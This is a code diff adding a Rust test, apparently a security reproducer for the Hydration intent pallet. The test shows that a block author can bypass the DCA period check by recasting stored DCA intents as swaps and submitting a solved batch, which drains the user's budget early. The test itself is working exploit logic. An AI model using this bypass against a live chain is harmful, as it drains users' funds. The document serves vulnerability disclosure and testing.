@@ -388,3 +388,126 @@ fn ice_dca_driving() {
 			assert_eq!(pallet_intent::Pallet::<Runtime>::account_intent_count(&alice), 0);
 		});
 }
+
+// === Security reproducer: DCA period is NOT enforced at resolve time ===
+//
+// `validate_dca_intent_resolve` (pallets/intent/src/lib.rs:801-809) checks only
+// `amount_in == dca.amount_in` and `amount_out >= dca.amount_out`. It does NOT
+// check `current_block >= dca.last_execution_block + dca.period`.
+//
+// The period is enforced only in `get_valid_intents()` — an OCW-local helper.
+// A block author runs their own OCW. They can skip the helper, read DCA
+// intents directly from storage, transform them into Swap intents via
+// `DcaData::to_swap_data()` (exactly what the helper itself does, minus the
+// filter), hand that to the solver, and submit the resulting Solution via
+// the normal unsigned extrinsic. `validate_resolve` — called from both the
+// pool-entry `validate_unsigned_solution` and the dispatch-time
+// `intent_resolved` — has no period check for DCA, so the solution is
+// accepted and `resolve_dca_intent` drains one `amount_in` from the budget.
+//
+// Repeated across consecutive blocks, this drains the entire budget in
+// `budget / amount_in` blocks instead of `budget / amount_in * period`
+// blocks. Time-averaging and the oracle pre-filter are both bypassed.
+//
+// This reproducer uses only public APIs — no production code changes.
+#[test]
+fn dca_period_can_be_bypassed_at_resolve_time() {
+	TestNet::reset();
+	let alice: AccountId = ALICE.into();
+	let budget = 5 * TRADE_AMOUNT;
+
+	crate::driver::HydrationTestDriver::with_snapshot(PATH_TO_SNAPSHOT)
+		.endow_account(alice.clone(), HDX, budget * 10)
+		.execute(|| {
+			enable_slip_fees();
+
+			// Loose 3% slippage — same as `dca_single_trade_execution`, known
+			// to produce a feasible solver quote on this snapshot.
+			submit_dca_hdx_bnc_with_slippage(alice.clone(), Some(budget), Permill::from_percent(3));
+
+			// Sanity: the honest OCW helper correctly filters the DCA out —
+			// period has not elapsed.
+			assert_eq!(
+				pallet_intent::Pallet::<Runtime>::get_valid_intents().len(),
+				0,
+				"honest OCW correctly filters DCA before period elapses"
+			);
+
+			// Advance a SINGLE block — nowhere near PERIOD=5.
+			hydradx_run_to_next_block();
+			assert_eq!(
+				pallet_intent::Pallet::<Runtime>::get_valid_intents().len(),
+				0,
+				"still not eligible"
+			);
+
+			let (intent_id, dca_before) = pallet_intent::Intents::<Runtime>::iter()
+				.next()
+				.map(|(id, intent)| match intent.data {
+					ice_support::IntentData::Dca(dca) => (id, dca),
+					_ => panic!("expected DCA"),
+				})
+				.unwrap();
+
+			// --- bypass: craft an intent list that skips the period filter ---
+			// Read Intents storage directly and apply the SAME `to_swap_data()`
+			// transform the honest helper uses, but without the
+			// `current_block >= last_execution_block + period` gate.
+			let crafted_intents: Vec<ice_support::Intent> = pallet_intent::Intents::<Runtime>::iter()
+				.map(|(id, intent)| {
+					let data = match intent.data {
+						ice_support::IntentData::Dca(ref dca) => ice_support::IntentData::Swap(dca.to_swap_data()),
+						other => other,
+					};
+					ice_support::Intent { id, data }
+				})
+				.collect();
+			assert_eq!(crafted_intents.len(), 1, "one crafted swap intent from the DCA");
+
+			let state = <<hydradx_runtime::HydrationSimulatorConfig as SimulatorConfig>::Simulators as SimulatorSet>::initial_state();
+
+			let solution = Solver::solve(crafted_intents, state)
+				.expect("solver produces a fill for the crafted swap intent");
+			assert_eq!(
+				solution.resolved_intents.len(),
+				1,
+				"solver resolved the out-of-period DCA as a plain swap"
+			);
+
+			// Submit via the normal unsigned dispatch — same call shape a
+			// malicious collator would emit from their OCW. `ensure_none`
+			// inside the extrinsic matches, and `intent_resolved` →
+			// `validate_resolve` → `validate_dca_intent_resolve` runs with
+			// NO period check.
+			hydradx_run_to_next_block();
+			assert_ok!(pallet_ice::Pallet::<Runtime>::submit_solution(
+				RuntimeOrigin::none(),
+				solution,
+			));
+
+			// --- proof of bypass ---
+			// The intent is still in storage (budget > amount_in), but one
+			// per-trade amount has been drained even though the period never
+			// elapsed. A well-behaved DCA would have consumed zero budget
+			// until block >= submit_block + PERIOD.
+			let intent_after = pallet_intent::Intents::<Runtime>::get(intent_id)
+				.expect("DCA still in storage (one trade consumed, budget > amount_in)");
+			match intent_after.data {
+				ice_support::IntentData::Dca(dca) => {
+					assert_eq!(
+						dca.remaining_budget,
+						dca_before.remaining_budget - TRADE_AMOUNT,
+						"one per-trade amount drained despite period not elapsed"
+					);
+					assert!(
+						dca.last_execution_block < dca_before.last_execution_block.saturating_add(dca_before.period),
+						"last_execution_block advanced before the period was due — bypass confirmed \
+						 (last_execution_block={}, next_eligible_was={})",
+						dca.last_execution_block,
+						dca_before.last_execution_block.saturating_add(dca_before.period),
+					);
+				}
+				_ => panic!("expected DCA"),
+			}
+		});
+}
